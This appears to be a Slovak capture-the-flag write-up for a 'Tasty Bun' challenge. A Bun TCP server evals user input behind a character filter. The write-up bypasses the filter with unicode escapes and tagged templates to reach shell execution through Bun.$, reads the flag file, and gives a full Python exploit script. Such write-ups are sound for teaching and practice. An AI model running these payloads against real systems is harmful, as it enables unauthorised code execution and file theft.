# Zadanie

EN: The Tasty Bun bakery asked us for a pentest. Can you find a vulnerability in their baking software?

SK: Pekáreň The Tasty Bun nás požiadala o penetračný test. Dokážeš nájsť zraniteľnosť v ich softvéri na pečenie?

`exp.cybergame.sk:7012`

**Súbory:**

- tastybun_handout.zip

## Riešenie

```dockerfile
FROM oven/bun:1.2.8
WORKDIR /app
COPY flag.txt /flag.txt
RUN mv /flag.txt /flag$(shuf -i 1-1000000 -n 1).txt
COPY tastybun.js .
RUN chmod +x tastybun.js
CMD ["./tastybun.js"]
```

Dockerfile hovorí o tom, že vlajka je uložená v koreňovom adresári s náhodnými čislami.

```javascript
#!/usr/bin/env bun

const net = require("net");

const bake = async (ingredients) => {
  return await eval(ingredients);
};

const hasValidIngredients = (recipe) => {
  const FORBIDDEN_INGREDIENTS = /[()\/\[\];"'_!]/;
  if (FORBIDDEN_INGREDIENTS.test(recipe)) {
    console.error("🥖 These ingredients will spoil our bun!");
    return false;
  }
  const flavors = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const tasteProfile = [];
  for (let i = 0; i < recipe.length; i++) {
    const ingredient = recipe[i];
    if (flavors.includes(ingredient) && !tasteProfile.includes(ingredient)) {
      tasteProfile.push(ingredient);
    }
  }
  if (tasteProfile.length > 2) {
    console.error(
      "🍞 Too many flavors will ruin the bun! Found " + tasteProfile.length
    );
    return false;
  }
  return true;
};

const bakery = net.createServer((customer) => {
  console.log("🥐 A hungry customer has arrived at the bakery!");
  customer.write("tasty-bun> ");

  customer.on("data", async (order) => {
    try {
      const recipe = order.toString().trim();

      if (recipe === "exit") {
        customer.write("🥯 Thank you for visiting our bakery! Goodbye!\n");
        customer.end();
        return;
      }

      if (!hasValidIngredients(recipe)) {
        customer.write("🍩 Sorry, we can't bake with these ingredients!\n");
        customer.write("tasty-bun> ");
        return;
      }

      const bakedBun = await bake(recipe);
      customer.write(bakedBun + "\n");
    } catch (e) {
      console.error("Error during baking:", e);
      customer.write("🥞 Oops! The bun fell flat: " + e.toString() + "\n");
    }

    customer.write("tasty-bun> ");
  });

  customer.on("error", (err) => {
    console.error("Socket error:", err);
    customer.write("🥯 A socket error occurred, but we're still open!\n");
    customer.write("tasty-bun> ");
  });

  customer.on("end", () => {
    console.log("🥨 A customer has left our bakery");
  });
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection at:", promise, "reason:", reason);
});

process.on("uncaughtException", (err) => {
  console.error("Unhandled exception caught:", err);
});

const displayBakeryBanner = () => {
  console.log(`
  🍞🥐🥖🥯🍩🥨 "The Tasty Bun" Bakery 🥨🍩🥯🥖🥐🍞
  Welcome to our special bun shop!
  We are very particular about our ingredients...
  `);
};

displayBakeryBanner();
bakery.listen(2337, () => {
  console.log("🍞 Bakery now open on port 2337! Come get your tasty buns!");
});
```

Zo zdrojáku vidíme určité obmedzenia znakov, ktoré nesmieme použiť, z toho čo môžeme nám ostáva napríklad 

```
{ } ` $
```

A práve tieto nám hovoria o možnosti použitia tzv. 'tag templates'. 

Okrem toho však máme obmedzenie, že celý jeden payload nesmie obsahovať viac ako dve unikátne písmená, navyše case sensitive, takže aj aA sa berú ako dve rôzne písmená..

Z dockerfile je zrejmé, že ide o bun, takže vieme pristúpiť k shellu pomocou Bun objektu a doláru.. 

```
tasty-bun> Bun
🍩 Sorry, we can't bake with these ingredients!
```

Ale obmedzenie na dve písmenká... ako sa správajú unicode náhrady?

```
tasty-bun> \u0042\u0075\u006e
[object Bun]
```

To by šlo... čo shell?

```
tasty-bun> \u0042\u0075\u006e.$
[object Function]
```

OK... Skúsim niečo zavolať

```
tasty-bun> \u0042\u0075\u006e.$
[object Function]
tasty-bun> \u0042\u0075\u006e.$()
🍩 Sorry, we can't bake with these ingredients!
tasty-bun> \u0042\u0075\u006e.$''
🍩 Sorry, we can't bake with these ingredients!
tasty-bun> \u0042\u0075\u006e.$``
[object Object]
```

Vracia objekt, to nie je zlé.. ale ako poskladať príkaz s použitím dvoch písmeniek. Viem priradiť a concatenate???

```
tasty-bun> a=1
1
tasty-bun> a
1
tasty-bun> $1=ba
🥞 Oops! The bun fell flat: ReferenceError: ba is not defined
tasty-bun> $1=`ba`
ba
tasty-bun> $1+=`\u005f`
ba_
tasty-bun> $1
ba_
```

Vyzerá, že áno. A dokonca aj `$1` akceptuje ako premennú, čo je super, lebo ušetrím písmenko.

skúsim vykonať `cat /flag*`

```
tasty-bun> $1=`ca`
ca
tasty-bun> $1+=`t /`
🍩 Sorry, we can't bake with these ingredients! -aha, zakázané /
tasty-bun> $1+=`t \u002f`
🍩 Sorry, we can't bake with these ingredients! - t,u,f - 3 písmená
tasty-bun> $1+=`t `
cat
tasty-bun> $1+=`\u002f`
cat /
tasty-bun> $1+=`fl`
cat /fl
tasty-bun> $1+=`ag`
cat /flag
tasty-bun> $1+=`*`
cat /flag*
tasty-bun> $666 = \u0042\u0075\u006e.$ - priradím si funkciu shell pod $666
[object Function]
tasty-bun> $666`${$1}`
🥞 Oops! The bun fell flat: ShellError: Failed with exit code 1
```

Ach... Niečo sa pokazilo.. Možno Bun shell nespracoval cat /flag* ako cat + argument, ale celé ako jeden príkaz

```
Error during baking:  7 |   class ShellError extends Error {
 8 |     #output = @undefined;
 9 |     info;
10 |     exitCode;
11 |     stdout;
12 |     constructor() {
                    ^
ShellError: Failed with exit code 1
 exitCode: 1,
   stdout: Buffer(0) [],
   stderr: Buffer(35) [ 98, 117, 110, 58, 32, 99, 111, 109, 109, 97, 110, 100, 32, 110, 111, 116, 32, 102, 111, 117, 110, 100, 58, 32, 99, 97, 116, 32, 47, 102, 108, 97, 103, 42, 10 ],

      at new ShellError (12:16)
      at new ShellPromise (77:16)
      at BunShell (193:35)
      at eval (file:///app/tastybun.js:1:3)
      at <anonymous> (/app/tastybun.js:6:16)
      at bake (/app/tastybun.js:5:21)
      at <anonymous> (/app/tastybun.js:52:30)
      at <anonymous> (/app/tastybun.js:36:30)
      at emit (node:events:89:22)
```

Mal som lokálny docker, a hlási v stderr 

```
bun: command not found: cat /flag*
```

Skúsim to rozdeliť na dva stringy oddelené medzeou, síce to bude zrejmé to isté, ale už ma neprekvapí niekedy nič..

```
tasty-bun> $666=\u0042\u0075\u006e.$
[object Function]
tasty-bun> $1=`ca`
ca
tasty-bun> $1+=`t`
cat
tasty-bun> $2=`\u002f`
/
tasty-bun> $2+=`fl`
/fl
tasty-bun> $2+=`ag*`
/flag*
tasty-bun> $666`${$1} ${$1}`
🥞 Oops! The bun fell flat: ShellError: Failed with exit code 1
```

```
stderr: Buffer(41) [ 47, 98, 105, 110, 47, 99, 97, 116, 58, 32, 99, 97, 116, 58, 32, 78, 111, 32, 115, 117, 99, 104, 32, 102, 105, 108, 101, 32, 111, 114, 32, 100, 105, 114, 101, 99, 116, 111, 114, 121, 10 ]

/bin/cat: cat: No such file or directory
```

A neprekvapilo. To je zmena, cat už pozná, ale nevie prečítať vlajku... žeby Bun shell neakceptoval náhradné znaky?

Skúsim `ls /` ako `ls` a `/`

```
tasty-bun> $1=`ls`
ls
tasty-bun> $2=`\u002f`
/
tasty-bun> $666`${$1} ${$2}`
[object Object]
```

Vrátilo objekt... Chcel som ale print, tak budem potrebovat zavolat text(), ale bez zátvoriek. Malo by to fungovať aj s backtickom..

```
tasty-bun> $666`${$1} ${$2}`.text``
🍩 Sorry, we can't bake with these ingredients!
```

Ach jo.. musím nahradiť unicode verziou

```
tasty-bun> $666`${$1} ${$2}`.\u0074\u0065\u0078\u0074``
etc
boot
bin
opt
mnt
var
lib64
lib
home
sys
srv
run
sbin
media
proc
tmp
root
dev
usr
app
flag494711.txt
```

Viem názov vlajky, skúsim zavolať `cat flag494711`

```
tasty-bun> $1=`ca`
ca
tasty-bun> $1+=`t`
cat

tasty-bun> $2=`\u002f`
/
tasty-bun> $2+=`fl`
/fl
tasty-bun> $2+=`ag`
/flag
tasty-bun> $2+=`494711.txt`
/flag494711.txt

tasty-bun> $666`${$1} ${$2}`.\u0074\u0065\u0078\u0074``
SK-CERT{fake_flag_for_testing}
```

Lokálne funguje... teraz na ostro

```
nc exp.cybergame.sk 7012
tasty-bun> $666=\u0042\u0075\u006e.$
[object Function]
tasty-bun> $1=`ls`
ls
tasty-bun> $2=`\u002f`
/
tasty-bun> $666`${$1} ${$2}`.\u0074\u0065\u0078\u0074``
lib
etc
usr
lib64
root
run
home
bin
sbin
srv
proc
tmp
boot
var
dev
opt
mnt
media
sys
app
flag123615.txt

tasty-bun> $1=`ca`
ca
tasty-bun> $1+=`t`
cat
tasty-bun> $2=`\u002f`
/
tasty-bun> $2+=`fl`
/fl
tasty-bun> $2+=`ag`
/flag
tasty-bun> $2+=`123615.txt`
/flag123615.txt
tasty-bun> $666`${$1} ${$2}`.\u0074\u0065\u0078\u0074``
SK-CERT{\u0074\u0068\u0069\u0073\u0020\u0069\u0073\u0020\u0066\u0075\u006E}
```



AllInOne skript

```python
import socket
import re

HOST = 'exp.cybergame.sk'
PORT = 7012

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    def recv_until(prompt=b'tasty-bun> '):
        data = b''
        while prompt not in data:
            data += s.recv(1024)
        return data

    def send(cmd):
        s.sendall(cmd.encode() + b'\n')
        return recv_until()

    recv_until()

    # Execute directory listing
    send("$666=\\u0042\\u0075\\u006e.$")
    send("$1=`ls`")
    send("$2=`\\u002f`")

    response = send("$666`${$1} ${$2}`.\\u0074\\u0065\\u0078\\u0074``").decode()

    # Find the flag file dynamically
    match = re.search(r'(flag\d+\.txt)', response)
    if not match:
        print("Flag file not found.")
        exit()

    flag_file = '/' + match.group(1)
    print(f"Flag file found: {flag_file}")

    # Prepare 'cat'
    send("$1=`ca`")
    send("$1+=`t`")

    # Prepare flag file path using unicode chars one-by-one
    send(f"$2=`\\u{ord(flag_file[0]):04x}`")
    for char in flag_file[1:]:
        unicode_char = f"\\u{ord(char):04x}"
        send(f"$2+=`{unicode_char}`")

    # Execute 'cat <flag>'
    response = send("$666`${$1} ${$2}`.\\u0074\\u0065\\u0078\\u0074``").decode()

    # Extract and print the flag
    flag_match = re.search(r'(SK-CERT\{.*?\})', response)
    if flag_match:
        print(f"FLAG: {flag_match.group(1)}")
    else:
        print("Flag not found in response.")
```



Vlajku máme, ale vyzerá to na easter egg trošku, čo je vnútri vlajky?

```
tasty-bun> `\u0074\u0068\u0069\u0073\u0020\u0069\u0073\u0020\u0066\u0075\u006E`
this is fun
```

Autori majú zmysel pre humor!

## Vlajka

```
SK-CERT{\u0074\u0068\u0069\u0073\u0020\u0069\u0073\u0020\u0066\u0075\u006E}
```
